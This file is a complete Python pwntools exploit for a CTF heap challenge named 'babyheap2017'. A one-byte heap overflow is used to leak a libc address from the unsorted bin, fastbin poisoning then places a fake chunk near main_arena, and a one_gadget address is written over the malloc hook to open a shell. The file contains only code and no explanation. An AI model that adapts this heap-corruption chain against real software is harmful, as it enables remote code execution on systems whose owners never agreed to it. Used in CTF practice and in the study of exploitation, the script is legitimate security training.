#!/usr/bin/python3
from pwn import *
#context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./babyheap2017')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()


def c(idx):
    sla("Command: ", idx)

def malloc(size):
    c(1)
    sla("Size: ", size)

def fill(idx, size, content):
    c(2)
    sla("Index: ", idx)
    sla("Size: ", size)
    sla("Content: ", content)

def show(idx):
    c(4)
    sla("Index: ", idx)

def free(idx):
    c(3)
    sla("Index: ", idx)


#===== Baby Heap in 2017 =====
#1. Allocate
#2. Fill
#3. Free
#4. Dump
#5. Exit
#Command: 4
#Index: 0


malloc(0x68) #0
malloc(0x68) #1
malloc(0x68) #2
malloc(0x68) #3

a = "A"*0x68 + "\xe1"
fill(0,0x69,a)
free(1)
malloc(0x68) #4

show(2)
ru("Content: \n")
address = rc(8)
b = u64(address)
main_arena = b - 88
libc.address = main_arena - 0x000000000039BB20
print("address:",hex(b))
print("mainarena:",hex(main_arena))
print("libcaddress:",hex(libc.address))

malloc(0x68) #5 clear the unsortedbin
free(1)
free(2)

payload1 = main_arena - 0x33
fill(4,8,p64(payload1).decode("iso-8859-1"))
malloc(0x68) #1
malloc(0x68) #2 fakechunk

onegadget = libc.address + 0x3f46a
payload = b"A"*3 + p64(onegadget)*3
fill(2,27,payload.decode("iso-8859-1"))

malloc(0x10)
input()
io.interactive()
